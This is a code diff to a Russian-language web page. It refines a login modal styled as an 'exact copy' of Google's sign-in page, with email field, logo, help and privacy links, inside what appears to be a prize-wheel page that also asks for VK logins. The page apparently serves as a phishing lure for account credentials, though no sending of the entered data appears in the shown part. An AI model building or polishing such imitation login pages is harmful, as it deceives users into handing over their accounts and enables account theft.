@@ -639,31 +639,17 @@
             font-family: Arial, sans-serif;
         }
         
-        /* Стили для Google формы (как на скриншоте IMG_0686.png) */
-        .google-icon {
-            width: 40px;
-            height: 40px;
-            background: #4285f4;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            margin: 0 auto 15px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-login-page {
-            display: flex;
-            flex-direction: column;
-            min-height: 500px;
-        }
-        
-        .google-header {
+        /* Стили для Google формы (точная копия оригинальной) */
+        .google-logo {
             text-align: center;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
+        }
+        
+        .google-logo-img {
+            width: 50px;
+            height: 50px;
+            object-fit: contain;
+            margin-bottom: 10px;
         }
         
         .google-title {
@@ -672,10 +658,6 @@
             color: #202124;
             margin-bottom: 20px;
             text-align: center;
-        }
-        
-        .google-input-group {
-            margin-bottom: 20px;
         }
         
         .google-email-input {
@@ -712,41 +694,6 @@
             text-decoration: none;
         }
         
-        .google-footer {
-            margin-top: auto;
-            padding-top: 20px;
-            border-top: 1px solid #e0e0e0;
-        }
-        
-        .google-footer-links {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-        }
-        
-        .google-language {
-            color: #5f6368;
-            font-size: 12px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-help-links {
-            display: flex;
-            gap: 15px;
-        }
-        
-        .google-help-links a {
-            color: #5f6368;
-            text-decoration: none;
-            font-size: 12px;
-            font-family: Arial, sans-serif;
-        }
-        
-        .google-help-links a:hover {
-            text-decoration: underline;
-        }
-        
         .google-buttons {
             display: flex;
             justify-content: space-between;
@@ -773,6 +720,37 @@
             cursor: pointer;
             font-weight: 500;
             font-family: Arial, sans-serif;
+        }
+        
+        .google-footer {
+            margin-top: 30px;
+            padding-top: 15px;
+            border-top: 1px solid #e0e0e0;
+            text-align: center;
+        }
+        
+        .google-language {
+            color: #5f6368;
+            font-size: 12px;
+            font-family: Arial, sans-serif;
+            display: inline-block;
+            margin-right: 10px;
+        }
+        
+        .google-help-links {
+            display: inline-block;
+        }
+        
+        .google-help-links a {
+            color: #5f6368;
+            text-decoration: none;
+            font-size: 12px;
+            font-family: Arial, sans-serif;
+            margin: 0 5px;
+        }
+        
+        .google-help-links a:hover {
+            text-decoration: underline;
         }
         
         .footer {
@@ -1205,7 +1183,7 @@
         </div>
     </div>
     
-    <!-- Google (точная копия со скриншота IMG_0686.png) -->
+    <!-- Google (точная копия оригинальной страницы с IMG_0686.png) -->
     <div class="login-modal" id="googleLoginModal">
         <div class="login-modal-content">
             <div class="login-modal-header">
@@ -1213,23 +1191,23 @@
                     <i class="fas fa-arrow-left"></i> Назад
                 </button>
             </div>
-            <div class="login-modal-body google-login-page">
-                <div class="google-header">
-                    <div class="google-icon">G</div>
-                    <div class="google-title">Вход</div>
+            <div class="login-modal-body">
+                <div class="google-logo">
+                    <!-- Здесь будет картинка вместо G -->
+                    <img src="google-logo.png" alt="Google" class="google-logo-img" id="googleLogoImg">
                 </div>
                 
+                <div class="google-title">Вход</div>
+                
                 <div style="text-align: center; margin-bottom: 20px;">
-                    <div style="font-size: 16px; color: #202124; margin-bottom: 20px;">Используйте аккаунт Google</div>
+                    <div style="font-size: 16px; color: #202124;">Используйте аккаунт Google</div>
                 </div>
                 
                 <div class="login-divider" style="margin: 15px 0;">
                     <span>или</span>
                 </div>
                 
-                <div class="google-input-group">
-                    <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
-                </div>
+                <input type="text" class="google-email-input" id="googleEmail" placeholder="Телефон или адрес эл. почты">
                 
                 <a href="#" class="google-forgot-link" onclick="googleForgotEmail()">Забыли адрес электронной почты?</a>
                 
@@ -1247,13 +1225,11 @@
                 </div>
                 
                 <div class="google-footer">
-                    <div class="google-footer-links">
-                        <div class="google-language">Русский</div>
-                        <div class="google-help-links">
-                            <a href="#" onclick="googleHelp()">Справка</a>
-                            <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
-                            <a href="#" onclick="googleTerms()">Условия</a>
-                        </div>
+                    <div class="google-language">Русский</div>
+                    <div class="google-help-links">
+                        <a href="#" onclick="googleHelp()">Справка</a>
+                        <a href="#" onclick="googlePrivacy()">Конфиденциальность</a>
+                        <a href="#" onclick="googleTerms()">Условия</a>
                     </div>
                 </div>
             </div>
@@ -1300,6 +1276,7 @@
             const spinSound = document.getElementById('spinSound');
             const winSound = document.getElementById('winSound');
             const socialOptions = document.querySelectorAll('.social-option');
+            const googleLogoImg = document.getElementById('googleLogoImg');
             
             // Элементы для ВКонтакте
             const vkPhoneField = document.getElementById('vkPhoneField');
@@ -1773,6 +1750,14 @@
                     const img = new Image();
                     img.src = `priz${i}.png`;
                 }
+                
+                // Предзагрузка логотипа Google
+                const googleLogo = new Image();
+                googleLogo.src = 'google-logo.png';
+                googleLogo.onerror = function() {
+                    // Если картинка не загружена, показываем заглушку
+                    googleLogoImg.style.display = 'none';
+                };
             }
             
             preloadImages();
